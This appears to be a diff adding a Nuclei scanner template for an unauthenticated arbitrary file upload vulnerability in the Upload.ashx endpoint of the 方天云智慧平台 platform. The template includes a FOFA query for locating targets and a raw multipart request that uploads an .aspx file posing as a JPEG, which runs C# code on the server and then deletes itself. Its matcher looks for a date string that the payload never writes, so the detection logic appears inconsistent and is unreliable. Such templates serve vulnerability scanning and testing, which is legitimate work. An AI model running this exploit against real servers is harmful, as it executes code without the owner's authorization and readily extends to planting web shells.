@@ -1,0 +1,45 @@
+id: ftyun-Upload-fileupload
+info:
+  name: 方天云智慧平台系统 Upload.ashx - fileupload
+  author: leadlife
+  severity: critical
+  description: 方天云智慧平台系统 Upload.ashx 接口处存在任意文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference: 
+    - https://github.com/wy876/POC/blob/9eefec0a4c311a412a86ab83bef3a25d3cb1766d/%E6%96%B9%E5%A4%A9%E4%BA%91%E6%99%BA%E6%85%A7%E5%B9%B3%E5%8F%B0%E7%B3%BB%E7%BB%9F/%E6%96%B9%E5%A4%A9%E4%BA%91%E6%99%BA%E6%85%A7%E5%B9%B3%E5%8F%B0%E7%B3%BB%E7%BB%9FUpload.ashx%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: false
+    fofa-query: body="AjaxMethods.asmx/GetCompanyItem"
+    hunter-query: demo
+    tips: 懒得提取回显, debug 从发访问即可
+    repair:
+    version:
+  tags: 2024,fileupload,ftyun
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y/%M/%D")}}'
+
+http:
+  - raw:
+      - |
+        POST /Upload.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySl8siBbmVicABvTX
+        Connection: close
+        
+        ------WebKitFormBoundarySl8siBbmVicABvTX
+        Content-Disposition: form-data; name="file"; filename="qwe.aspx"
+        Content-Type: image/jpeg
+        
+        <%@Page Language="C#"%><%Response.Write("{{randstr}}");System.IO.File.Delete(Request.PhysicalPath);%>
+        ------WebKitFormBoundarySl8siBbmVicABvTX--
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200
+          - contains(body,'{{date}}')
+        condition: and
